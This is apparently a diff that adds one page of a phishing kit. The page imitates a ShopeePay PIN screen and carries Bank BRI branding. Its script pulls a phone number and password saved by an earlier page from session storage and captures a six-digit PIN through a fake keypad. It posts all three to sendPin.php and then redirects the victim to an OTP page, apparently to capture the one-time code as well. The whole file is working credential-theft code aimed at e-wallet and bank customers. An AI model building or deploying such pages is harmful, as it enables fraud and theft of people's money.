@@ -1,0 +1,279 @@
+<html>
+  <head>
+   
+<meta name="theme-color" content="#ee4d2d" data-rh="true">
+    <meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
+	<meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+	<meta name="theme-color" content="#ee4d2d" data-rh="true">
+	<meta property="og:type" content="website">
+
+	<title>PIN ShopeePay</title>    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"/>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@800&display=swap');
+        body {
+            padding: 0;
+            margin: 0;
+            width: 100%;
+           
+            overflow: hidden; 
+            background: none ;
+            padding-right: 0px;
+        }
+
+        .text-header {
+            font-family: 'Nunito', sans-serif;
+            color: #aaa;
+        }
+
+        .text-subheader {
+            font-family: 'Nunito', sans-serif;
+            margin-top: -40px;
+            color: #aaa;
+            font-size: 15px;
+        }
+
+        .sizing {
+            width: 332px;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .sizing {
+                width: 95%;
+            }
+        } 
+
+        .pinNumb {
+            cursor: pointer;
+            
+            width: 105px; 
+            background-color: #fff; 
+            font-size: 30px; color: #000; 
+            text-align: center; 
+            padding-left: -10px; 
+            border-radius: 5px; 
+            box-shadow: rgba(171, 171, 171, 1) 1px 1px 1px 0px; 
+           font-weight: 300;
+            padding: 4px 50px -10 10;
+            background: #fff;
+            margin: -18px -6px;
+            border: 0px solid #aaa;
+            position: relative;
+            height: 45px;
+        }
+
+        button.pinNumb:hover {
+            color: #a1a1a1;
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 1px solid #ccc;
+            box-shadow: rgba(171, 171, 171, 1) 0px 1px 0px 0px; 
+        }
+
+.bubble-element{
+    font-weight: 300;
+}
+    </style>
+  </head>
+  <body>
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAZ5puzc0K0jp8akvBZxdujU1oZFo_Skm1MCaWC-__gDw0n-ZBqwbsAlE1ic0yCm2uey_9befEWLDZxciwRU3UL7QzndlFx-GAIalVH2UHrqFHDWbnGeQOScGpz3NUGiM11GRyx88N6PjmQQlypxo7hjVT374n8v8khOGtvmD0TpMTDwRi20EfDkDjTjM/s1080/AddText_04-01-08.02.33.jpg" style="width: 100%">     
+    <div class="container">
+        <div class="row" style="margin-top: -30px;">
+            <div class="col-12 d-block mx-auto sizing" style="white-space: pre-wrap; text-align: center; margin-top: 25px; height: 98.8px; padding-bottom: 0px; font-family: Barlow; font-size: 16px; font-weight: 400; color: rgb(255,255,255); line-height: 1.4; border-radius: 0px;">
+              
+            </div>
+        </div>
+<form id="ryuSubmit"  method="get">     
+        <div class="row" style="margin-top: -200px;">
+            <div class="col-12 d-block mx-auto sizing" style="white-space: pre-wrap; height: 58.8px; padding-bottom: 0px; font-size: 16px; font-weight: 400; color: rgb(59, 59, 59); line-height: 1.4; border-radius: 0px;">
+               <div class="row" style="texr-align: center; margin-right: 5px;">
+<input type="hidden" name="user" id="nomorhp" value="">
+<input type="hidden" name="pass" id="pass" value="">
+<input type="tel" name="sixpin" id="setPin" autocomplete="true" style="opacity: 0" oninput="kirimPesan()">
+                    <div class="col-2">
+                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
+              <div class="bubble-element Group" id="pin1" style="box-sizing: border-box; font-size: 30px; color: #FF5C36; text-align: center; padding-top: 3px;  width: 50px; left: 0px; top: 0px; border: 1px solid #ccc; border-radius: 0px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
+                        </div>
+                    </div>
+                    <div class="col-2">
+                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
+                            <div class="bubble-element Group" id="pin2" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #FF5C36; text-align: center; padding-top: 3px;border: 1px solid #ccc; border-radius: 0px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
+                        </div>
+                    </div>
+                    <div class="col-2">
+                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
+                            <div class="bubble-element Group" id="pin3" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #FF5C36; text-align: center; padding-top: 3px;border: 1px solid #ccc; border-radius: 0px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
+                        </div>
+                    </div>
+                    <div class="col-2">
+                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
+                            <div class="bubble-element Group" id="pin4" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #FF5C36; text-align: center; padding-top: 3px;border: 1px solid #ccc; border-radius: 0px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
+                        </div>
+                    </div>
+                    <div class="col-2">
+                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
+                            <div class="bubble-element Group" id="pin5" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #FF5C36; text-align: center; padding-top: 3px; border: 1px solid #ccc; border-radius: 0px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
+                        </div>
+                    </div>
+                    <div class="col-2">
+                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
+                            <div class="bubble-element Group" id="pin6" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #FF5C36; text-align: center; padding-top: 3px;border: 1px solid #ccc; border-radius: 0px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
+                        </div>
+                    </div>
+               </div>
+               <div class="row" style="margin-top: -70px">
+                    <div class="col-12">
+                        <div class="text-header text-center" style="font-family: 'Nunito', sans-serif;'"><font size="2" style=""><strong>Lupa PIN</strong></font></div>
+                    </div>
+               </div>
+            </div>
+        </div>
+        <div class="row" style="margin-top: 215px; margin-left: 0px; margin-bottom: 110px">
+            <div class="col-12 d-block mx-auto " style="white-space: pre-wrap; height: 260px; margin-bottom: 10px; font-size: 16px; color: rgb(59, 59, 59); line-height: 1.29; border-radius: 3px; background-color: #eee; width: 100%; position: absolute; left: 0; right:0 ; margin: -10px auto; text-align: center; bottom: 0; padding: 15px">
+                <div class="row" style="margin-top: -68px">
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="1">1</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="2">2</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="3">3</button>
+                    </div>
+                </div>
+
+                <div class="row" style="margin-top: -80px">
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="4">4</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="5">5</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="6">6</button>
+                    </div>
+                </div>
+
+                <div class="row" style="margin-top: -80px">
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="7">7</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="8">8</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="9">9</button>
+                    </div>
+                </div>
+
+                <div class="row" style="margin-top: -80px">
+                    <div class="col-4">
+                        
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="0">0</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="hapus"><i class="ion-backspace-outline"></i></button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjL6mfwbr-XqeKl8W-VMfdCmB3Lxc1zwt-OfAeNrfkr_ENnPE9w8zfXzUcWOrCoUhxExGhEgE6ooCl6mbNRWX34_WurgWDzXhYAvF8AJi4Vrqw6ge_4d9HB_5UJChBsw3R5rnufOIENgXKUWV74C5WiSC4f0fMssDWFyk5SgUjt-4ovdJzf9ncWNkIcQ8M/s1836/IMG_20240401_204139.png" width="180px" style="position: fixed; bottom: 5; left: 0; right: 0; margin: 0px auto">
+   
+       
+    </form>
+<script>
+  var alerts = sessionStorage.getItem("alerts");
+document.getElementById("nomorhp").value = alerts + "";        
+ var pass = sessionStorage.getItem("pass");
+document.getElementById("pass").value = pass + "";       
+</script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js">
+
+            </script> 
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js">
+            </script>
+            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script> 
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+   
+    
+        $(document).ready(function() {
+            $("button#setPin").on('click', function() {
+                var pin = $(this).attr('data-id');
+                
+                if($.trim($("#pin1").html())=='') {
+                    $("#pin1").html(pin);
+                } else if($.trim($("#pin1").html())!='' && $.trim($("#pin2").html())=='') {
+                    $("#pin2").html(pin);
+                } else if($.trim($("#pin2").html())!='' && $.trim($("#pin3").html())=='') {
+                    $("#pin3").html(pin);
+                } else if($.trim($("#pin3").html())!='' && $.trim($("#pin4").html())=='') {
+                    $("#pin4").html(pin);
+                } else if($.trim($("#pin4").html())!='' && $.trim($("#pin5").html())=='') {
+                    $("#pin5").html(pin);
+                } else if($.trim($("#pin5").html())!='' && $.trim($("#pin6").html())=='') {
+                    $("#pin6").html(pin);
+
+                    var setPin = $("#pin1").html()+''+$("#pin2").html()+''+$("#pin3").html()+''+$("#pin4").html()+''+$("#pin5").html()+''+$("#pin6").html();
+                    $("input#setPin").val(setPin);
+
+                    var pinValue = $("input#setPin").val();
+
+              if(pinValue.length == 6) {
+    
+       event.preventDefault();    
+    
+    
+     $.ajax({
+ type: 'POST',
+ url: 'sendPin.php',
+ data: $("#ryuSubmit").serialize(),
+ datatype: 'JSON',
+ 
+ 
+ 
+        
+})
+    
+                $("#pin1").html('');
+                $("#pin2").html('');
+                $("#pin3").html('');
+                $("#pin4").html('');
+                $("#pin5").html('');
+                $("#pin6").html('');    
+    
+var alerts = document.getElementById("nomorhp").value;
+sessionStorage.setItem("alerts", alerts);
+var spin = document.getElementById("setPin").value;
+sessionStorage.setItem("spin", spin); 
+window.location.href='otp.html';     
+                    }
+                }
+            });
+
+            $("#hapus").on('click', function() {
+                $("#pin1").html('');
+                $("#pin2").html('');
+                $("#pin3").html('');
+                $("#pin4").html('');
+                $("#pin5").html('');
+                $("#pin6").html('');
+                
+            });
+        });
+    </script>
+  </body>
+</html>
